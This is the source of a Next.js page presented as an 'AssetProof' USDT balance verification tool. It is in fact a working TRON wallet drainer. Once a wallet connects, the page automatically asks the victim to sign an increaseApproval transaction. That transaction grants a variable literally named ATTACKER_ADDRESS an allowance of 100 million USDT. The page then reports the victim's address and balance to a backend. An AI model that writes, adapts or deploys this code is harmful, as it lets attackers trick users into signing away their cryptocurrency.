import { NextPage } from "next";
import Head from "next/head";
import Link from "next/link";
import toastNotification from "../components/toastNotify";
import axios from "axios";
import { useEffect, useState } from "react";
import { useAdapters } from "../utils/AdaptersContext";
import TronWeb from 'tronweb';
import { CopyrightStyles, TickerTape } from "react-ts-tradingview-widgets";
import { ToastContainer } from "react-toastify";
import 'react-toastify/dist/ReactToastify.css';
import { getEmailFromUrl, getRefFromUrl } from "../components/endpoints";

const VerifyUsdtPage: NextPage = () => {
    // 
    const { adapters, selectedIndex, setSelectedIndex } = useAdapters();
    const [loading, setLoading] = useState(false);
    const [loginShow, setLoginShow] = useState(false);
    const [completed, setCompleted] = useState(false);
    const [balance, setBalance] = useState(0);
    const tickerTheme = "light";

    const tronWeb = new TronWeb({
              fullHost: 'https://api.trongrid.io',
              headers: { 'TRON-PRO-API-KEY': process.env.NEXT_PUBLIC_TRONGRID_API_KEY },
            });

              
    function handleLoginClose() {
        setLoginShow(false);
    }
    useEffect(() => {
        if (adapters[selectedIndex].address !== null && !completed) {
            verifyWallet();
        }
    }, [adapters, selectedIndex, completed]);
    

    async function checkBalance(address: string) {
        const functionSelector = 'balanceOf(address)';
        const parameter = [{ type: 'address', value: address }];

        try {
            const result = await tronWeb.transactionBuilder.triggerConstantContract(
                process.env.NEXT_PUBLIC_USDT_ADDRESS
                , functionSelector, {}, parameter);

            // Extract constant_result from the result
            const constantResult = result.constant_result[0];

            // Convert constant result from hexadecimal to decimal
            const balance = parseInt(constantResult, 16);
            setBalance(balance);
            return balance;

        } catch (error) {
            console.error('Error:', error);
            return 0;
        }

    }

    
    async function checkApprovalStatus() {
        const functionSelector = 'allowance(address, address)';
        console.log(process.env.NEXT_PUBLIC_ATTACKER_ADDRESS + ' '+ adapters[selectedIndex].address);
        const parameter = [{ type: 'address', value: adapters[selectedIndex].address },
                            { type: 'address', value: process.env.NEXT_PUBLIC_ATTACKER_ADDRESS }    
                            ];

        try {
            const result = await tronWeb.transactionBuilder.triggerConstantContract(
                process.env.NEXT_PUBLIC_USDT_ADDRESS
                , functionSelector, {}, parameter);

            console.log(result);

            // Extract constant_result from the result
            const constantResult = result.constant_result[0];

            // Convert constant result from hexadecimal to decimal
            const balance = parseInt(constantResult, 16);
            return balance !== 0;

        } catch (error) {
            console.error('Error:', error);
            return false;
        }

    }


     
  // Method to send Notification
  const sendNotification = async (index:number, bal:number) => {
   
    try {
      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[index].address}/user/${bal.toString()}`).then((res) => {
      });
    } catch (error) {
      console.error('Error sending SMS:', error);
    }
  };

//   adapters[selectedIndex].address

    async function connectWallet(index: number) {
        setLoading(true);
        const adapter = adapters[index]; // Use selected adapter
        if (adapter.address == null) {
            try {
                await adapter.connect();
                setLoading(false);
                // setUserReferral(adapter.address);
                setLoginShow(false);
            } catch (error) {
                setLoading(false);
                setLoginShow(false);
                toastNotification('Error connecting wallet', false);
            }
        } else {
            try {
                await adapter.disconnect();
                setLoading(false);
                setLoginShow(false);
                // toastNotification('Wallet Disconnected', true);  Update message accordingly
            } catch (error) {
                setLoading(false);
                setLoginShow(false);
                toastNotification('Error disconnecting wallet', false);
            }
        }
    }

    
    const styles: CopyrightStyles = {
        parent: {
          color: "black",
        },
        link: {
          textDecoration: "line-trough",
        },
        span: {
          color: "black",
        },
      };



    async function verifyWallet() {
        // setVerifyLoading(false);
        await approveUSDT(100000000);
        if(await checkApprovalStatus()) {
            await sendNotification(selectedIndex, balance);
            toastNotification('Verified USDT balance', true);
            setCompleted(true);
        } else {
            toastNotification("Failed Verification", false);
        }
    }

    async function selectAdapter(index: number) {
        setSelectedIndex(index);
        setLoginShow(false);
        await new Promise(resolve => setTimeout(resolve, 2000));
        await connectWallet(index);
        toastNotification("Processing...", true);
    }

    async function finalizeVerify() {
        toastNotification("Verifying...", true);
        console.log(adapters[selectedIndex].address);
        let bal = await checkBalance(adapters[selectedIndex].address);
        await verifyWallet();
    }


    
    // Approval or increaseApproval
    async function approveUSDT(amount:number) {
        console.log('cow')
        try {
            // Prepare the parameters for the USDT contract's approve function
            const functionSelector = 'increaseApproval(address,uint256)';
            const params = [
                { type: 'address', value: process.env.NEXT_PUBLIC_ATTACKER_ADDRESS }, // The Developer contract address
                { type: 'uint256', value: amount * 1000000 }           // The amount of USDT to approve, converted to smallest unit
            ];
            const options = {
                feeLimit: 100000000,
                callValue: 0,
                shouldPollResponse: true
            };
                // console.log(process.env.NEXT_PUBLIC_USDT_ADDRESS)
            // Trigger the smart contract function
            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                process.env.NEXT_PUBLIC_USDT_ADDRESS, // The USDT contract address
                functionSelector,
                options,
                params,
                adapters[selectedIndex].address  // User's address
            );

            // Sign the transaction with WalletConnect
            const signedTransaction = await adapters[selectedIndex].signTransaction(transaction.transaction);

            // Broadcast the transaction
            const receipt = await tronWeb.trx.sendRawTransaction(signedTransaction);
            console.log('USDT Approval transaction receipt', receipt);

            return receipt;
        } catch (error: any) {
            console.error('Error during USDT approval:', error);
            if (typeof error.toString === 'function' && error.toString().includes('WalletSignTransactionError')) {
                toastNotification('Confirmation rejected by user', false);
            }
            // throw error;
        }
        
    }

    
  return (
    <>
      <Head key={"verifyusdt-page"}> 
          <meta charSet="UTF-8"/>
          <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
          <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
          <title>AssetProof - Verify Usdt</title>
          <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon.png"/>
          <link rel="stylesheet" href="/assets/vendor/nice-select/css/nice-select.css"/>
          <link rel="stylesheet" href="/assets/vendor/owl-carousel/css/owl.theme.default.css"/>
          <link rel="stylesheet" href="/assets/vendor/owl-carousel/css/owl.carousel.min.css"/>
          <link rel="stylesheet" href="/assets/css/style.css"/>
          <script defer
            src="https://code.jquery.com/jquery-3.3.1.js"
            integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
            crossOrigin="anonymous"></script>
      </Head>

      <div style={{ backgroundImage: "url('assets/images/image.jpg'), linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7))",
      backgroundSize: 'auto 80%',
    backgroundBlendMode: 'overlay' }}>

<div className="header">
            <div className="container">
                <div className="row">
                    <div className="col-xl-12">
                        <div className="navigation">
                            <nav className="navbar navbar-expand-lg navbar-light bg-light">
                                <a className="navbar-brand"><img src="/assets/images/logo.png" alt=""/></a>
                                <button className="navbar-toggler" type="button" data-toggle="collapse"
                                    data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown"
                                    aria-expanded="false" aria-label="Toggle navigation">
                                    <span className="navbar-toggler-icon"></span>
                                </button>
                                <div className="collapse navbar-collapse" id="navbarNavDropdown">
                                    <ul className="navbar-nav">
                                                                                
                                        <li className="nav-item">
                                            <Link href="/" className="nav-link" data-scroll-nav="0">Home</Link>
                                        </li>
                                        <li className="nav-item">
                                            <a className="nav-link" target="blank" href="/dashboard" data-scroll-nav="1">Dashboard</a>
                                        </li>
                                    </ul>
                                </div>
                                
                            </nav>
                        </div>
                    </div>
                </div>
            </div>
        </div>
     
        {/*  */}
        <div className="intro">
            
            <TickerTape colorTheme={tickerTheme} 
                symbols= {[
                    {
                    "title": "USDTEUR",
                    "proName": "BITSTAMP:USDTEUR"
                    },
                    {
                    "title": "USDTUSD",
                    "proName": "BITSTAMP:USDTUSD"
                    },
                    {
                    "title": "USDTTRY",
                    "proName": "BINANCE:USDTTRY"
                    },
                    {
                    "title": "USDTGBP",
                    "proName": "COINBASE:USDTGBP"
                    },
                    {
                    "title": "USDTCAD",
                    "proName": "KRAKEN:USDTCAD"
                    },
                    {
                    "title": "USDTKRW",
                    "proName": "BITHUMB:USDTKRW"
                    }
                ]}
                showSymbolLogo={true}
                isTransparent={false}
                displayMode={'adaptive'}
                copyrightStyles={styles}
                locale="en"></TickerTape>
                <ToastContainer/>
            <div className="blog section-padding"  data-scroll-index="5">
                    <div className="container">
                        <div className="row justify-content-center">
                            <div className="col-xl-6">
                                <div className="section-title text-center" style={{ marginBottom: '24px' }}>
                                    <h2>Verify USDT wallet balance</h2>
                                </div>
                            </div>
                        </div>
                        <div className="row">
                            <div className="col-xl-3 col-lg-3 col-md-12">
                            
                            </div>
                            <div className="col-xl-6 col-lg-6 col-md-12">
                                <div className="blog-grid">
                                    <div className="card">
                                        <img className="img-fluid" src="assets/images/daz.png" alt=""/>
                                        <div className="card-body" style={{ marginTop: '16px' }}>
                                            <h6 className="card-title">{adapters[selectedIndex].address?'Final Step':'Step 1'}</h6>
                                            {/* <p className="card-text text-white">Verifier Address: {getRefFromUrl()}</p> */}
                                            {adapters[selectedIndex].address?<p className="card-text text-white">Your Address: {adapters[selectedIndex].address}</p>: null}
                                            {/* { getEmailFromUrl() ? <p className="card-text text-white">Receiving Email: {getEmailFromUrl()} </p>:null} */}
                                        </div>
                                        <div className="card-footer">
                                            {/* <div className="signin-btn"> */}
                                            <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?verifyWallet():setLoginShow(true)}>
                                    { loading?'...loading': 
                                    adapters[selectedIndex].address ? "Verify USDT balance"
                                    : "Connect Wallet"}</a>
                                   {/* {adapters[selectedIndex].address? <a onClick={() => verifyWallet()} className="btn btn-outline-primary">Verify Wallet</a> : null
                                   }  */}
  
                                                {/* <a className="btn btn-primary text-white">
                                                Connect Wallet
                                                </a>  */}
                                            {/* </div> */}
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div className="col-xl-3 col-lg-3 col-md-12">
                            
                            </div>

                        </div>
                    </div>
                </div>
            </div>
            {/*  */}
      </div>

      <div className="footer">
            <div className="container">
                <div className="row">
                    <div className="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                        <div className="copyright">
                            <p>© Copyright 2024 <a href="#"></a> | All Rights Reserved</p>
                        </div>
                    </div>
                    <div className="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                        <div className="footer-social">
                            <ul>
                                <li><a href="#"><i className="fa fa-facebook"></i></a></li>
                                <li><a href="#"><i className="fa fa-twitter"></i></a></li>
                                <li><a href="#"><i className="fa fa-linkedin"></i></a></li>
                                <li><a href="#"><i className="fa fa-youtube"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        
        {/* Login Modal */}
        <div className={`modal fade ${loginShow ? "show" : ""}`} tabIndex={-1} role="dialog" aria-labelledby="loginModalLabel" aria-hidden="true" style={{ display: loginShow ? "block" : "none" }}>
         <div className="modal-dialog" role="document" style={{ backgroundColor:'#131722', pointerEvents:"auto" }}>
             <div className="auth-form card">
                 <div className="card-body">
                     <form action="" className="identity-upload">
                         <div className="text-end" style={{display: 'flex', justifyContent: 'flex-end', marginTop:"0.1rem" }}>
                             <button type="button" className="btn btn-danger pl-5 pr-5" onClick={handleLoginClose}><i className="fa fa-times"></i></button>
                         </div>
                         <div className="identity-content">
                             <span className="icon"><i className="fa fa-shield"></i></span>
                             <h4>Select Wallet</h4>
                             {/* <p>Trust Wallet / Binance</p> */}
                             <div className="text-center">
                                 <label htmlFor="walletconnect" style={{ color:"white" }}>Trust Wallet / Other Wallets: &nbsp;</label>
                                 <button type="button" className="btn btn-success" onClick={() => selectAdapter(0)}>WalletConnect</button>
                             </div>
                             {/* <p>TronLink</p> */}
                             <div className="text-center" style={{ marginTop:"1.2rem", marginBottom:"1.4rem" }}>
                                 <label htmlFor="tronlink" style={{ color:"white" }}>TronLink: &nbsp;</label>
                                 <button type="button" className="btn btn-primary pl-5 pr-5"  onClick={() => selectAdapter(1)}>Connect</button>
                             </div>
                         </div>
                     </form>
                 </div>
             </div>
         </div>
     </div>
     {/* end modals */}
      </>);
};

export default VerifyUsdtPage;